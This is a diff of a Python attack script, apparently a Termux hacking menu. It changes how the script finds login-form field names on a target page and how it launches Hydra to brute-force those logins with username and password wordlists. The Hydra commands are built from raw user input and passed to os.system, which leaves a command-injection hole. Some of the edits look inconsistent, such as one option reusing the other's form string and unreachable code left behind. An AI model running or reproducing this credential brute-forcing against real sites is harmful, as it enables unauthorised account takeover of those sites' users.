@@ -974,27 +974,37 @@ def get_tool_path(tool_name):
         return f"/data/data/com.termux/files/home/bin/{tool_name}"
 
 def check_url_validity():
-    while True:
-        url = input(Fore.YELLOW + "Enter target URL: ")
-        if "." not in url:
-            print_colored("Invalid URL format! Please include a valid domain.", Fore.RED)
-            continue
-        try:
-            response = requests.get(url)
-            if response.status_code == 200:
-                print_colored("Valid URL and reachable!", Fore.GREEN)
-                return url
-            else:
-                print_colored(f"Failed to connect to URL (Status: {response.status_code}).", Fore.RED)
-        except requests.RequestException:
-            print_colored("Connection error. Please enter a valid URL.", Fore.RED)
+    target_url = input(Fore.YELLOW + "Enter target URL (include 'http:// or https://'): ")
+    try:
+        response = requests.get(target_url)
+        if response.status_code == 200:
+            print_colored("URL is valid and reachable.", Fore.GREEN)
+            return target_url
+        else:
+            print_colored("URL is not reachable. Please check and try again.", Fore.RED)
+            return check_url_validity()
+    except requests.exceptions.RequestException:
+        print_colored("Invalid URL. Please try again.", Fore.RED)
+        return check_url_validity()
 
 def extract_login_fields(url):
     try:
         response = requests.get(url)
-        response.raise_for_status()
-    except requests.exceptions.RequestException as e:
-        print("Error fetching the page:", e)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        form = soup.find('form')
+        username_field = password_field = None
+
+        if form:
+            input_fields = form.find_all('input')
+            for field in input_fields:
+                if field.get('type') == 'password':
+                    password_field = field.get('name')
+                elif 'user' in field.get('name', '').lower() or 'email' in field.get('name', '').lower():
+                    username_field = field.get('name')
+        
+        return username_field, password_field
+    except Exception as e:
+        print_colored(f"Error fetching login fields: {e}", Fore.RED)
         return None, None
 
     soup = BeautifulSoup(response.text, 'html.parser')
@@ -1018,11 +1028,6 @@ def extract_login_fields(url):
         print("Could not find the username or password fields automatically.")
     
     return username_field, password_field
-
-def start_vulnerability_scan(target_url, wordlist_path):
-    dirb_path = get_tool_path("dirb")
-    print_colored("Starting Dirb scan...", Fore.GREEN)
-    os.system(f"dirb {target_url} {wordlist_path}")
 
 def path_discovery():
     print_colored("\nPath Discovery Options", Fore.CYAN)
@@ -1051,37 +1056,24 @@ def path_discovery():
                     print_colored("Invalid choice! Please enter a valid number.", Fore.RED)
                     continue
                 
+                username_field, password_field = extract_login_fields(target_url)
+                if not (username_field and password_field):
+                    print_colored("Could not detect username or password fields.", Fore.RED)
+                    break
+
+                login_path = '/' + '/'.join(target_url.split("/", 3)[3:])
+                
                 if bf_choice == '1':
                     userlist_name = input(Fore.YELLOW + "Enter username wordlist filename (with extension): ")
                     passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): ")
                     
-                    username_field, password_field = extract_login_fields(target_url)
-                    if username_field and password_field:
-                        login_path = '/' + '/'.join(target_url.split("/", 3)[3:])  # استخدم المسار فقط
-                        hydra_command = (
-                            f"hydra -I -L {userlist_name} -P {passlist_name} "
-                            f"https-post-form://{target_url}:{username_field}=^USER^&{password_field}=^PASS^:"
-                            f"F=Invalid username or password -t 1 -W 3"
-                        )
-                        os.system(hydra_command)
-                    else:
-                        print_colored("Failed to retrieve username or password fields for Hydra.", Fore.RED)
+                    os.system(f"hydra -I -L {userlist_name} -P {passlist_name} https-post-form://{target_url}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password -t 1 -W 3")
                 
                 elif bf_choice == '2':
                     username = input(Fore.YELLOW + "Enter username: ")
                     passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): ")
 
-                    _, password_field = extract_login_fields(target_url)
-                    if password_field:
-                        login_path = '/' + '/'.join(target_url.split("/", 3)[3:])  # استخدم المسار فقط
-                        hydra_command = (
-                            f"hydra -I -l {username} -P {passlist_name} "
-                            f"{target_url} http-post-form '{login_path}:{password_field}=^PASS^:"
-                            f"F=Invalid username or password' -t 1 -W 3"
-                        )
-                        os.system(hydra_command)
-                    else:
-                        print_colored("Failed to retrieve password field for Hydra.", Fore.RED)
+                    os.system(f"hydra -I -l {username} -P {passlist_name} https-post-form://{target_url}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password -t 1 -W 3")
 
         elif choice == '3':
             return  # Back to Main Menu
